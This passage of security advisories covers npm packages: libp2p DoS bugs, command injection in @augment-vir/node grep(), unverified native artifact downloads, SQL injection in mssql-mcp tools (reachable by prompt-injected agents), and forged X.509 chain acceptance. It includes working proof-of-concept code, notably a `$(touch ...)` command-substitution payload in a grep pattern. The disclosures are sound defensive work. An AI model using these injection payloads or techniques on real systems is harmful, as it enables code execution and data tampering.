### GHSA-rvfr-cqwq-rc4j — libp2p: ASN.1 DER decoder drives an unbounded synchronous loop on attacker-controlled length fields, stalling the Node event loop pre-auth
- Aliases: CVE-2026-110789 | Published: 2026-11-17 | Modified: 2026-11-17 | Severity: HIGH
- CWE: CWE-130, CWE-400
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected npm/@libp2p/crypto: introduced:0 fixed:5.1.22

### Summary
A remote peer can stall a js-libp2p node's entire event loop for ~4–5 seconds per connection (and transiently allocate ~2 GB) by sending a ~15-byte crafted `publicKey` inside an Identify message. The malformed key reaches the DER decoder before any peer-id/signature check, so the attack is pre-auth and repeatable indefinitely by reconnecting.

### Details
`packages/crypto/src/keys/rsa/der.ts` `readLength()` parses DER long-form lengths with no comparison to `buf.byteLength`, and `readInteger()` then loops over the attacker-claimed length:

```ts
function readInteger (buf, context) {
  const length = readLength(buf, context)   // attacker-controlled, claims up to 2^64
  const end = context.offset + length
  for (let i = context.offset; i < end; i++) // runs far past buf.byteLength
    vals.push(buf[i])                         // pushes `undefined` past the end
}
```

The blob reaches the parser pre-auth: Identify runs on every `connection:open` and calls `publicKeyFromProtobuf(publicKey)` (`packages/protocol-identify/src/identify.ts:85`) before the `connection.remotePeer.equals(id)` check at `identify.ts:88`. The `MAX_RSA_JWK_SIZE` guard in `pkixToRSAPublicKey` only bounds the total blob size, not the inner length field, so a 15-byte payload defeats it; the ECDSA path (`unmarshalECDSAPublicKey`) has no cap at all. The decode runs in a single synchronous tick, so no `AbortSignal` — including Identify's 5 s timeout — can interrupt it. Verified on js-libp2p commit `a04f5e0`, where `@libp2p/crypto` reads `5.1.21`.

### PoC
Full PoC attached (`libp2p-crypto-der-eventloop-dos-poc.tar.gz`). Build the js-libp2p monorepo at the affected version (`npm install --ignore-scripts && npm run build`), extract the package inside the monorepo root (sibling of `packages/`), then `cd libp2p-crypto-der-eventloop-dos-poc && node attack.mjs`. Expected:

```
[*] round 1: payload sent=true, victim event-loop stall = 4s, peak RSS ~1980 MB
[*] round 2: payload sent=true, victim event-loop stall = 4-5s, peak RSS ~1980 MB
[*] round 3: payload sent=true, victim event-loop stall = 4s, peak RSS ~1980 MB
[!] Vulnerability reproduced: 3/3 connections each stalled the victim's event loop for ~4-5s — one crafted ~15-byte Identify publicKey per connection, pre-auth
```

The stall is measured from the victim's own 1 s heartbeat clock (frozen while the loop is blocked); the ~2 GB transient RSS peak is read from `/proc/<pid>/status`. The DER `RangeError` is swallowed by Identify's `.catch(() => {})`, so the node survives and every new connection re-stalls it; under a container memory limit the ~2 GB spike OOM-kills the process. A `node attack.mjs control` run (legitimate Identify) shows 0 s stalls.

### Impact
CWE-130/CWE-400. Any node running the default Identify service is affected. A single peer can keep the node unresponsive to all of its peers (every new connection adds another multi-second stall — all timers, heartbeats, and protocol timeouts stop) and, in memory-constrained deployments, force an OOM kill. Suggested fix: in `readLength`, reject any long-form length whose value exceeds `buf.byteLength - context.offset`; in `readInteger`/`readObjectIdentifier`/`readBitString`/`readOctetString`, clamp or assert `end`/`finalOffset` against `buf.byteLength` before looping; add an overall DER-element-length sanity cap at `decodeDer` entry and a byte-length cap in `unmarshalECDSAPublicKey`.

[libp2p-crypto-der-eventloop-dos-poc.tar.gz](https://github.com/user-attachments/files/30452369/libp2p-crypto-der-eventloop-dos-poc.tar.gz)

### GHSA-x2vm-cf3p-m2w8 — libp2p: gossipsub creates a permanent topics-map entry per distinct subscription with no cap in the default config
- Aliases: CVE-2026-119793 | Published: 2026-11-17 | Modified: 2026-11-17 | Severity: HIGH
- CWE: CWE-400, CWE-770
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected npm/@libp2p/gossipsub: introduced:0 fixed:17.0.0

### Summary
A single gossipsub peer can grow a node's `topics` map without bound by flooding subscription RPCs, because the default configuration has no global, per-peer, or topic-length cap and peer scoring does not penalise subscription volume. The peer is never greylisted, so the growth continues toward OOM.

### Details
`handleReceivedSubscription` (`packages/gossipsub/src/gossipsub.ts:1028`, line 1036) runs `this.topics.set(topic, new Set())` for every distinct topic string:

```ts
private handleReceivedSubscription (from, topic, subscribe) {
  let topicSet = this.topics.get(topic)
  if (subscribe) {
    if (topicSet == null) {
      topicSet = new Set()
      this.topics.set(topic, topicSet)   // no global cap, no per-peer cap
    }
    topicSet.add(from.toString())
  }
}
```

The only topical gate (`gossipsub.ts:981`, `if (this.allowedTopics != null && !this.allowedTopics.has(topic)) return`) is skipped when `allowedTopics` is null — the default. Subscriptions are unsigned RPC metadata (no signature needed); `decodeRpc`'s per-RPC limit caps count (`maxSubscriptions = 5000`) but not topic-string length or aggregate size; and the peer-scoring components P1–P7 have no subscription-volume term, so the attacker's score stays at 0 (above the `graylistThreshold` of −80) and `acceptFrom` keeps returning true. Verified on js-libp2p commit `a04f5e0`, where `@libp2p/gossipsub` reads `16.0.4`.

### PoC
Full PoC attached (`gossipsub-topics-unbounded-growth-poc.tar.gz`). Build the js-libp2p monorepo at the affected version (`npm install --ignore-scripts && npm run build`), extract the package inside the monorepo root (sibling of `packages/`), then `cd gossipsub-topics-unbounded-growth-poc && node attack.mjs`. Expected (default config):

```
[*] sending 300 RPC frames x 4000 unique ~190-byte topic subscriptions (1,200,000 topics total)
[*]   progress: 88% sent | victim topics=1,032,000 rss=740MB peers=1
[*] victim quiesced: topics=~1,100,000 rss=~870MB peers=1
[!] Vulnerability reproduced: one connected peer grew the victim's gossipsub topics map to ~1.1M entries (RSS +~900MB) with 300 subscription RPCs — no global, per-peer, or topic-length cap in the default config
```

Control run (`ALLOWED_TOPICS=legit-topic`, i.e. `node attack.mjs control`): the identical flood is rejected at the `allowedTopics` gate and the topics map stays at 0 entries — confirming the vulnerable condition is the default `allowedTopics`-unset config. The map grows monotonically with no cap until the victim's own resource pressure trips; on disconnect `removePeer` performs an O(N) sweep over every topic entry (a secondary CPU cost) while the ~1 GB heap stays committed.

### Impact
CWE-400/CWE-770. Every node running default gossipsub is affected; the attacker needs only one connection and is never rate-limited or greylisted. Growth continues toward OOM; on disconnect the O(N) `removePeer` sweep adds CPU cost. Suggested fix: bound by default (not opt-in) — a global cap on `topics.size`, a per-peer subscription cap with a P7 behaviour penalty so `acceptFrom` eventually greylists, a topic-string length cap at decode time, and/or flipping `allowedTopics` to deny-by-default; make `removePeer`'s topic iteration non-blocking/capped.

[gossipsub-topics-unbounded-growth-poc.tar.gz](https://github.com/user-attachments/files/30452451/gossipsub-topics-unbounded-growth-poc.tar.gz)

### GHSA-xvcc-vqjv-phqh — augment-virShell allows Command Injection in `grep()` via Unsanitized `searchPattern`
- Aliases: CVE-2026-63496 | Published: 2026-11-18 | Modified: 2026-11-18 | Severity: HIGH
- CWE: CWE-78
- CVSS_V3: `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`
- Affected npm/@augment-vir/node: introduced:0 fixed:31.73.5

## Shell Command Injection in `grep()` via Unsanitized `searchPattern`

### Summary

The `grep()` function exported by `@augment-vir/node` inserts caller-controlled search patterns directly into a double-quoted shell command string without sanitization (`grep.ts:310`). When the constructed command is passed to `spawn()` with `shell: 'bash'` (`shell.ts:98-99`), bash evaluates `$()` command substitution expressions embedded in the pattern, resulting in arbitrary OS command execution as the Node.js process user. Any downstream application that passes untrusted input to `grep()`'s `pattern` or `patterns` field is vulnerable to unauthenticated local (and potentially remote) code execution. CVSS Base Score: **7.8 (High)**.

### Details

**Root cause:** `packages/node/src/augments/fs/grep.ts:310` maps each search pattern into the shell fragment `-e "${searchPattern}"` with no sanitization:

```ts
// grep.ts:310
...searchPatterns.map((searchPattern) => `-e "${searchPattern}"`),
```

The resulting full command string is forwarded to `runShellCommand` (`grep.ts:320`), which calls `streamShellCommand` (`shell.ts:221-224`), which ultimately calls:

```ts
// shell.ts:98-99
const childProcess = spawn(command, {
    shell,   // defaults to 'bash' (shell.ts:92)
```

Because `shell` is `'bash'`, bash interprets `$()` within the double-quoted pattern as a command substitution and executes it before `grep` ever runs.

**Incomplete sanitization:** An `escape()` helper exists at `grep.ts:178-180` but only replaces `"` with `\"` and removes newlines. It is applied to `excludePatterns`, `excludeDirs`, and `includeFiles` (`grep.ts:297-308`) but **not** to `searchPatterns`. Even if it were applied, double-quote escaping does not prevent `$()` or backtick substitution inside bash double-quote contexts.

**Data flow (source → sink):**

| Step | Location | Description |
|------|----------|-------------|
| 1 | `packages/node/src/index.ts:3` | `export * from './augments/fs/grep.js'` — exposes `grep()` as a public npm API |
| 2 | `packages/node/src/augments/fs/grep.ts:223-226` | `grep()` accepts caller-controlled `grepSearchPattern` and `grepSearchLocation` |
| 3 | `packages/node/src/augments/fs/grep.ts:228` | `searchPatterns` derived from `grepSearchPattern.patterns \|\| [grepSearchPattern.pattern]` |
| 4 | `packages/node/src/augments/fs/grep.ts:269-314` | `fullCommand` built as a plain shell string |
| 5 | `packages/node/src/augments/fs/grep.ts:310` | **Sink:** `searchPattern` inserted as `` `-e "${searchPattern}"` `` — no escaping applied |
| 6 | `packages/node/src/augments/fs/grep.ts:320` | `fullCommand` passed to `runShellCommand` |
| 7 | `packages/node/src/augments/terminal/shell.ts:221-224` | Forwarded to `streamShellCommand` |
| 8 | `packages/node/src/augments/terminal/shell.ts:98-99` | `spawn(command, { shell: 'bash' })` executes the constructed command string |

**Suggested remediation:**

```diff
--- a/packages/node/src/augments/fs/grep.ts
+++ b/packages/node/src/augments/fs/grep.ts
@@
-function escape(input: string) {
-    return input.replaceAll('"', String.raw`\"`).replaceAll('\n', '');
+function shellQuote(input: string) {
+    return `'${input.replaceAll("'", String.raw`'\''`).replaceAll('\n', '')}'`;
 }
@@
-        ...searchPatterns.map((searchPattern) => `-e "${searchPattern}"`),
+        ...searchPatterns.map((searchPattern) => `-e ${shellQuote(searchPattern)}`),
+        '--',
         ...searchParts,
```

Alternatively, replace the shell-string approach with `spawn('grep', args, { shell: false })` to avoid shell interpretation entirely.

### PoC

**Prerequisites:** Docker installed on the host. All steps run locally inside a container — no network exposure, no real credentials, no DoS.

**Step 1 — Build the Docker image:**

```bash
docker build -t augment-vir-vuln-001-poc \
  vuln-001
```

**Step 2 — Run the exploit container:**

```bash
docker run --rm --name augment-vir-vuln-001-run augment-vir-vuln-001-poc
```

**Core exploit (`exploit.mjs` inside the container):**

```js
import { grep } from '@augment-vir/node';

await grep(
  { pattern: '$(touch /tmp/augment-vir-poc-triggered)no-match' },
  { file: 'package.json' },
);
```

The `$()` shell substitution in the pattern causes bash to execute `touch /tmp/augment-vir-poc-triggered` before grep runs. The sentinel file is created even though the grep pattern itself matches nothing in `package.json`.

**Expected output:**

```
[*] Calling grep() with injected $() command substitution pattern...
[*] Pattern: $(touch /tmp/augment-vir-poc-triggered)no-match

=== VULNERABLE ===
[+] COMMAND INJECTION CONFIRMED: sentinel file exists at /tmp/augment-vir-poc-triggered
[+] The $() substitution in pattern was executed by bash via spawn({shell:"bash"})
```

**Minimal reproduction without Docker:**

```bash
mkdir /tmp/av-grep-poc && cd /tmp/av-grep-poc
npm init -y
npm install @augment-vir/node@31.73.2

cat > poc.mjs <<'EOF'
import { grep } from '@augment-vir/node';
await grep(
  { pattern: '$(touch /tmp/augment-vir-grep-poc)no-match' },
  { file: 'package.json' },
);
EOF

rm -f /tmp/augment-vir-grep-poc
node poc.mjs
test -f /tmp/augment-vir-grep-poc && echo VULNERABLE
```

**Verification:** Both Phase 1 static analysis and Phase 2 dynamic reproduction confirmed the vulnerability. `VULNERABLE` and `COMMAND INJECTION CONFIRMED` were observed in stdout; the sentinel file `/tmp/augment-vir-poc-triggered` was created inside the Docker container.

### Impact

This is an **OS Command Injection (CWE-78)** vulnerability. Any application that calls `@augment-vir/node`'s `grep()` with user-controlled input in the `pattern` or `patterns` field is vulnerable to arbitrary command execution under the Node.js process's user account.

- **Confidentiality — High:** An attacker can read arbitrary files accessible to the process.
- **Integrity — High:** An attacker can write or delete files, install malware, or modify application data.
- **Availability — High:** An attacker can terminate processes or exhaust system resources.

The attack vector is classified as Local (the attacker must control the value passed to `pattern` at the library API level). In practice the severity escalates to Network-reachable if a web service or API maps any user-supplied string to the `grep()` `pattern` parameter. No authentication or special privileges are required; the function is exported from the package's main entry point and is enabled by default.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
FROM node:22-slim

# Install grep (required by @augment-vir/node's grep() implementation)
RUN apt-get update -qq && apt-get install -y --no-install-recommends grep && rm -rf /var/lib/apt/lists/*

WORKDIR /poc

# Initialize npm project and install the vulnerable package version
RUN npm init -y && \
    npm install @augment-vir/node@31.73.2 --save 2>&1 | tail -5

# Create the exploit script that demonstrates command injection via grep()
# The pattern '$(touch /tmp/augment-vir-poc-triggered)no-match' is injected
# into the shell command string without sanitization, causing $() substitution
# to execute 'touch /tmp/augment-vir-poc-triggered' under bash.
RUN cat > /poc/exploit.mjs << 'EOF'
import { grep } from '@augment-vir/node';
import { existsSync } from 'node:fs';

const SENTINEL_FILE = '/tmp/augment-vir-poc-triggered';

// Remove sentinel file if it exists from a previous run
import { rmSync } from 'node:fs';
try { rmSync(SENTINEL_FILE); } catch {}

console.log('[*] Calling grep() with injected $() command substitution pattern...');
console.log('[*] Pattern: $(touch /tmp/augment-vir-poc-triggered)no-match');

try {
  await grep(
    { pattern: '$(touch /tmp/augment-vir-poc-triggered)no-match' },
    { file: 'package.json' },
  );
} catch (err) {
  // grep() may throw due to no matches — that is expected and irrelevant
  console.log('[*] grep() threw (expected when no matches):', err?.message ?? err);
}

if (existsSync(SENTINEL_FILE)) {
  console.log('');
  console.log('=== VULNERABLE ===');
  console.log('[+] COMMAND INJECTION CONFIRMED: sentinel file exists at', SENTINEL_FILE);
  console.log('[+] The $() substitution in pattern was executed by bash via spawn({shell:"bash"})');
  process.exit(0);
} else {
  console.log('');
  console.log('=== NOT EXPLOITED ===');
  console.log('[-] Sentinel file was NOT created — injection did not fire.');
  process.exit(1);
}
EOF

CMD ["node", "/poc/exploit.mjs"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC for VULN-001: Shell Command Injection in @augment-vir/node grep()
CWE-78 — OS Command Injection
Affected version: @augment-vir/node@31.73.2

Root cause:
  packages/node/src/augments/fs/grep.ts:310 constructs a shell command string
  using unsanitized caller-supplied searchPattern inside double quotes:
    ...searchPatterns.map((searchPattern) => `-e "${searchPattern}"`)
  This command string is passed to spawn(command, { shell: 'bash' }), meaning
  $() command substitution in the pattern is executed by bash.

Safe usage: This PoC runs entirely inside a local Docker container.
            No external network attacks, no real credentials, no DoS.
"""

import subprocess
import sys
import os
import json

IMAGE_NAME = "augment-vir-vuln-001-poc"
CONTAINER_NAME = "augment-vir-vuln-001-run"
DOCKERFILE_DIR = os.path.dirname(os.path.abspath(__file__))

BUILD_CMD = f"docker build -t {IMAGE_NAME} {DOCKERFILE_DIR}"
RUN_CMD = f"docker run --rm --name {CONTAINER_NAME} {IMAGE_NAME}"


def run(cmd, **kwargs):
    """Run a shell command and return CompletedProcess."""
    print(f"[cmd] {cmd}")
    return subprocess.run(cmd, shell=True, capture_output=True, text=True, **kwargs)


def main():
    print("=" * 60)
    print("VULN-001 PoC: Shell Command Injection in grep()")
    print("Package: @augment-vir/node@31.73.2")
    print("=" * 60)

    # Step 1: Build Docker image
    print("\n[*] Building Docker image...")
    build_result = run(BUILD_CMD, timeout=300)
    if build_result.returncode != 0:
        print("[!] Docker build FAILED")
        print(build_result.stdout[-2000:] if build_result.stdout else "")
        print(build_result.stderr[-2000:] if build_result.stderr else "")
        write_result(
            passed=False,
            verdict="FAIL",
            reason="Docker 빌드 실패 — npm install 또는 네트워크 오류",
            evidence=build_result.stderr[-1000:],
        )
        sys.exit(1)
    print("[+] Docker image built successfully")

    # Step 2: Run exploit container
    print("\n[*] Running exploit container...")
    run_result = run(RUN_CMD, timeout=120)

    combined_output = run_result.stdout + run_result.stderr
    print(combined_output)

    # Step 3: Evaluate result
    vulnerable = "VULNERABLE" in combined_output and "COMMAND INJECTION CONFIRMED" in combined_output

    if vulnerable:
        print("\n[+] PASS — Command injection confirmed inside Docker container")
        print("[+] The $() substitution in grep() pattern was executed by bash")
        write_result(
            passed=True,
            verdict="PASS",
            reason=(
                "Docker 컨테이너 내에서 grep() 패턴에 포함된 $() 명령 치환이 bash에 의해 실행되었음을 확인. "
                "sentinel 파일 /tmp/augment-vir-poc-triggered가 생성되었으며 stdout에서 'VULNERABLE' 및 "
                "'COMMAND INJECTION CONFIRMED' 문자열이 관측됨."
            ),
            evidence=combined_output.strip()[-1500:],
        )
        sys.exit(0)
    else:
        print("\n[-] FAIL — exploit did not produce expected output")
        write_result(
            passed=False,
            verdict="FAIL",
            reason=(
                "컨테이너 stdout에서 'VULNERABLE' 또는 'COMMAND INJECTION CONFIRMED'가 관측되지 않음. "
                "sentinel 파일이 생성되지 않았거나 grep() 동작이 예상과 다를 수 있음."
            ),
            evidence=combined_output.strip()[-1500:],
        )
        sys.exit(1)


def write_result(passed, verdict, reason, evidence):
    result = {
        "passed": passed,
        "verdict": verdict,
        "reason": reason,
        "build_command": BUILD_CMD,
        "run_command": RUN_CMD,
        "poc_command": f"python3 {os.path.abspath(__file__)}",
        "evidence": evidence,
        "artifacts": ["Dockerfile", "poc.py"],
    }
    out_path = os.path.join(DOCKERFILE_DIR, "phase2_result.json")
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(result, f, ensure_ascii=False, indent=2)
    print(f"\n[*] Result written to {out_path}")


if __name__ == "__main__":
    main()
```

### GHSA-88q3-gch3-5396 — install-artifact-from-github loads downloaded native artifacts without integrity verification
- Aliases: CVE-2026-73864 | Published: 2026-11-18 | Modified: 2026-11-18 | Severity: HIGH
- CWE: CWE-494
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H`
- Affected npm/install-artifact-from-github: introduced:0 fixed:1.7.0

## Description

`bin/install-from-cache.js` downloads a prebuilt native addon (`*.node`) over the network and writes it directly to the artifact path **with no cryptographic integrity verification of any kind** — no checksum manifest, no signature, no SRI. A scan of the whole package for `createHash|sha256|checksum|integrity|digest|signature` finds nothing. The file is then `require()`-loaded by the consumer, which executes the addon's native module-init code. Anyone able to influence the download achieves code execution on the installing machine.

### Affected code (v1.6.0)

- **Mirror is fully attacker-steerable via an env var, no host pinning** — `bin/install-from-cache.js:80`:
  ```js
  let assetUrl = mirrorHost || process.env[mirrorEnvVar] || 'https://github.com';
  ```
  `re2` passes `--host-var RE2_DOWNLOAD_MIRROR`, so setting `RE2_DOWNLOAD_MIRROR` (CI config, `.npmrc`/env passthrough, a compromised CI job, a poisoned shell profile) redirects 100% of the download to an arbitrary host with zero pinning.

- **The write sink is a bare `writeFile`, no verification** — `bin/install-from-cache.js:185-187`:
  ```js
  const write = async (name, data) => {
    await fsp.mkdir(path.dirname(name), {recursive: true});
    await fsp.writeFile(name, data);   // `data` is the raw HTTP response body
  };
  ```

- **Cleartext transfer + silent protocol downgrade on redirect** — `bin/install-from-cache.js:155,165`:
  ```js
  const httpLib = isHttps.test(url) ? https : isHttp.test(url) ? http : null;   // http:// supported
  ...
  get(res.headers.location).then(resolve, reject);   // re-derives protocol from the NEW url
  ```
  An `https://` asset that 302-redirects to `http://` is followed and fetched over plaintext, no warning, no scheme pinning, no redirect cap.

### The post-download "verification" is not an integrity gate

`isVerified()` optionally runs `npm run verify-build` / `npm test` *after* writing the file. For `re2`, `scripts/verify-build.js` `require()`s the binary as its first line — i.e. the downloaded addon's native code has **already executed** by the time any check runs. It is a functional smoke test, not an integrity gate, and it is skipped entirely when any `npm_config_platform*` env var is set (`:120-122`).

## Proof of concept

A self-contained, **non-malicious** PoC (`poc.js`) proves the missing-integrity property against the real `install-from-cache`, without shipping a weaponized binary: it stands up a plaintext-HTTP "mirror" serving a sentinel payload, runs `install-from-cache` with `RE2_DOWNLOAD_MIRROR` pointed at it, and shows the served bytes are written **verbatim** to `build/Release/re2.node`:

```
npm i install-artifact-from-github
IAFG_BIN=./node_modules/install-artifact-from-github/bin/install-from-cache.js node poc.js
```
```
attacker mirror (plaintext http) on 127.0.0.1:PORT
  [mirror] served 2083 attacker bytes over HTTP for /uhop/node-re2/releases/download/1.24.1/darwin-arm64-137
Writing to build/Release/re2.node ... Done.
install-from-cache exit: 0
served   sha256: ec6fdde6...4ebc
written  sha256: ec6fdde6...4ebc
✓ attacker bytes written VERBATIM to build/Release/re2.node — NO integrity check rejected them
```

The install **succeeds (exit 0)** with attacker-controlled bytes at the artifact path. Because a real `.node` executes on `require()` (NAPI/`NODE_MODULE` init), substituting a malicious one yields code execution in the installing/running process. (A full code-execution harness using a benign marker-writing native addon was verified separately and is available on request; withheld here to avoid shipping executable payloads.)

## Attack scenarios (any one suffices)
- Attacker-configured or later-compromised `RE2_DOWNLOAD_MIRROR`.
- Tampered GitHub release / compromised maintainer account — no checksum detects a swapped asset, even over HTTPS.
- On-path attacker where a plaintext (`http://`) mirror or an `https→http` redirect is in play.

## Suggested fix
1. Publish per-release `SHASUMS256.txt` (or embed expected digests) and verify the download's SHA-256 **before** writing/loading; refuse on mismatch. (This is the model `prebuild-install` already uses.)
2. Reject `http://` asset URLs and `https→http` redirect downgrades; pin scheme across redirects; cap redirect count/hosts.
3. Document that `verify-build`/`test` run *after* load and cannot gate integrity.

## PoC
**poc.js:**

```js
// PoC — install-artifact-from-github writes a network-downloaded artifact to disk with NO
// integrity verification, from an env-controlled mirror, over plaintext HTTP.
//
// This proves the CORE defect (arbitrary attacker-supplied bytes become build/Release/re2.node
// with zero checksum/signature check) WITHOUT shipping a weaponized native binary: we serve a
// sentinel payload and show byte-for-byte (sha256) that it is written verbatim as the artifact.
// Because a .node artifact is dlopen()'d on require (running its module-init native code), an
// attacker who substitutes it — via a compromised/attacker-set RE2_DOWNLOAD_MIRROR, a tampered
// GitHub release, or an on-path MITM on the plaintext path — achieves code execution.
//
// Run:  IAFG_BIN=/path/to/install-artifact-from-github/bin/install-from-cache.js node poc.js
//       (defaults to require.resolve if install-artifact-from-github is installed nearby)
const http = require('http');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');

const IAFG = process.env.IAFG_BIN || require.resolve('install-artifact-from-github/bin/install-from-cache.js');
const SENTINEL = Buffer.from('ATTACKER-CONTROLLED-ARTIFACT-BYTES-' + 'A'.repeat(2048)); // stand-in for a malicious .node
const servedSha = crypto.createHash('sha256').update(SENTINEL).digest('hex');

const work = fs.mkdtempSync(path.join(os.tmpdir(), 'iafg-poc-'));
fs.writeFileSync(path.join(work, 'package.json'), JSON.stringify({
  name: 're2', version: '1.24.1', repository: { type: 'git', url: 'https://github.com/uhop/node-re2.git' },
  scripts: { 'verify-build': 'node -e "process.exit(0)"' } // trivial pass; the WRITE happened before this
}));

const server = http.createServer((req, res) => {
  process.stdout.write(`  [mirror] served ${SENTINEL.length} attacker bytes over HTTP for ${req.url}\n`);
  res.writeHead(200, { 'content-type': 'application/octet-stream' });
  res.end(SENTINEL);
});

server.listen(0, '127.0.0.1', () => {
  const port = server.address().port;
  console.log(`attacker mirror (plaintext http) on 127.0.0.1:${port}`);
  const child = spawn('node', [IAFG,
    '--artifact', 'build/Release/re2.node',
    '--host-var', 'RE2_DOWNLOAD_MIRROR',
    '--skip-path-var', 'RE2_DOWNLOAD_SKIP_PATH',
    '--skip-ver-var', 'RE2_DOWNLOAD_SKIP_VER'], {
    cwd: work, stdio: ['ignore', 'inherit', 'ignore'],
    env: { ...process.env, RE2_DOWNLOAD_MIRROR: `http://127.0.0.1:${port}`,
      npm_package_version: '1.24.1', npm_package_github: 'https://github.com/uhop/node-re2',
      npm_package_scripts_verify_build: 'node -e "process.exit(0)"' }
  });
  child.on('exit', (code) => {
    server.close();
    console.log('install-from-cache exit:', code);
    const artifact = path.join(work, 'build/Release/re2.node');
    if (fs.existsSync(artifact)) {
      const writtenSha = crypto.createHash('sha256').update(fs.readFileSync(artifact)).digest('hex');
      console.log('served   sha256:', servedSha);
      console.log('written  sha256:', writtenSha);
      console.log(servedSha === writtenSha
        ? '✓ attacker bytes written VERBATIM to build/Release/re2.node — NO integrity check rejected them (served over plaintext HTTP from an env-controlled mirror). A real .node here would execute on require().'
        : '✗ sha mismatch');
    } else {
      console.log('✗ artifact not written (check IAFG_BIN path)');
    }
    fs.rmSync(work, { recursive: true, force: true });
  });
});
```

## Patches

Fixed in **1.7.0** via hash-bag verification. The consuming package publishes an `artifactHashes` map (`slot → sha256:<hex>` of the decompressed binary) in its *own* `package.json` — immutable once on npm, stamped at publish time by the new `hash-github-cache --write` bin (e.g. wired as `prepublishOnly`). `install-from-cache` now verifies the decompressed download **before writing it to disk**; a hash mismatch or a missing slot rejects the download and falls back to building from source. Verification is scoped to the default `github.com` source — an explicitly configured mirror (`--host` / mirror env var) remains trust-the-mirror by design. Because the bytes are checked against the published bag, an on-path attacker or an `https→http` transport downgrade on the default path is also defeated by content verification.

Note: verification activates only when the consuming package ships an `artifactHashes` bag; packages without one behave as before (backward-compatible, zero-config default). `node-re2 >= 1.26.0` publishes a stamped bag.

## Workarounds

On `<= 1.6.0`: skip downloading entirely and build from source via the documented dev short-circuit (`DEVELOPMENT_SKIP_GETTING_ASSET` env var, or a `.development` file). 1.7.0 adds first-class `--force-build` / `DOWNLOAD_FORCE_BUILD` for the same effect. In all versions, never point a mirror variable (e.g. `RE2_DOWNLOAD_MIRROR`) at a host you do not fully control.

### GHSA-2m9m-6cr5-9x25 — mssql-mcp-core: SQL injection in mssql-mcp write tools via unparameterized table names and WHERE clauses
- Aliases: CVE-2026-63129 | Published: 2026-11-19 | Modified: 2026-11-19 | Severity: HIGH
- CWE: CWE-89
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
- Affected npm/@connorbritain/mssql-mcp-core: introduced:0 fixed:0.6.0
- Affected npm/@connorbritain/mssql-mcp-reader: introduced:0 fixed:0.5.0
- Affected npm/@connorbritain/mssql-mcp-writer: introduced:0 fixed:0.5.0
- Affected npm/@connorbritain/mssql-mcp-server: introduced:0 fixed:0.6.0

Several tools in `mssql-mcp-core` built T-SQL by string-interpolating caller-supplied identifiers and predicates directly into the statement passed to the node-mssql `Request.query()` batch API. Only data values were parameterized.

Affected tools and inputs:
- `update_data`, `delete_data`: `tableName` and the free-form `whereClause` were interpolated raw.
- `insert_data`: `tableName` and column names (object keys) were interpolated raw.
- `execute_transaction`: the same raw `tableName`/`whereClause` interpolation per operation.
- `create_table`, `create_index`, `drop_table`: table/column/index/schema identifiers were interpolated with no or insufficient validation.
- `list_databases` (reader tier): the `stateFilter` argument was interpolated raw into the query, with only a non-enforced inputSchema enum guarding it.

The only check on `whereClause` was that it was non-empty. Because the row-count and preview queries run before the `confirmUpdate`/`confirmDelete` step, a malicious `whereClause` or `tableName` executed on the first call, bypassing the preview/confirmation and `maxRows` safety controls. `Request.query()` submits a multi-statement T-SQL batch, so a crafted input enabled stacked statements (arbitrary DDL/DML), sub-selects, and (with a privileged login and `xp_cmdshell` enabled) OS command execution. Because `list_databases` is a read-only tool, the `stateFilter` sink makes the reader package injectable as well.

## Impact

An actor who can supply tool arguments (a malicious or compromised MCP client, or an LLM agent steered via indirect prompt injection) could read, modify, or drop arbitrary data, bypass the `read_data` allow/deny validation and the preview/confirmation/`maxRows` safeguards, and conditionally achieve OS command execution.

## Patches

Fixed in `@connorbritain/mssql-mcp-core` 0.6.0:
- All identifiers are validated against a strict allowlist and bracket-quoted via a shared helper.
- The free-form `whereClause` string parameter is removed (breaking change) and replaced with structured, parameterized filters (`{ column, operator, value }`) using an operator allowlist. Values are always bound, never interpolated.
- `list_databases` validates `stateFilter` against a fixed allowlist before use.

Upgrade the consumer packages: `mssql-mcp-reader` 0.5.0, `mssql-mcp-writer` 0.5.0, `mssql-mcp-server` 0.6.0 (all depend on core `^0.6.0`).

## Workarounds

Upgrading is the only complete fix; the `list_databases` (`stateFilter`) sink is reachable even under `READONLY=true` and in the reader package. As defense in depth, run the server under a least-privilege SQL login with `xp_cmdshell` disabled, and restrict which MCP clients can invoke the tools.

References:

- https://nvd.nist.gov/vuln/detail/CVE-2026-63129 [ADVISORY]

### GHSA-4c2f-96cf-f5fc — OpenID4VP: X.509 chain validation accepts a forged certificate that reuses a trusted anchor's Subject DN without verifying its signature
- Aliases: CVE-2026-75522 | Published: 2026-11-19 | Modified: 2026-11-19 | Severity: HIGH
- CWE: CWE-295, CWE-347
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`
- Affected npm/@openeudi/openid4vp: introduced:0 fixed:0.8.1

## Summary

`ChainBuilder` (the private RFC 5280 validator behind `TrustEvaluator` and the public credential-parsing API) terminated chain building on **Subject Distinguished Name string equality** rather than on cryptographic closure to a trust anchor. A certificate whose Subject DN string matched a trusted anchor's Subject DN was accepted as the chain terminus **with no signature verification** against the anchor's public key.

An attacker who mints a self-signed certificate and copies a trusted anchor's Subject DN string onto it can therefore have that certificate — and any credential signed with its private key — accepted as issued under a trusted authority.

## Impact

A relying party using `@openeudi/openid4vp` to verify OpenID4VP presentations (mdoc / SD-JWT VC) could be induced to accept a **forged credential as genuine**, defeating the trust-anchor model. In an eIDAS / EUDI age- or identity-verification deployment this permits impersonation of a trusted issuer.

Exploitable through the public verification path: `TrustEvaluator.evaluate()` returns a successful result (and, due to a secondary fallback, attributes the forged leaf to a real anchor's metadata), so downstream callers see a trusted outcome.

## Details

`src/trust/ChainBuilder.ts`, `tryBuild()`:

```js
while (current.subject !== anchor.subject) { /* verify & climb */ }
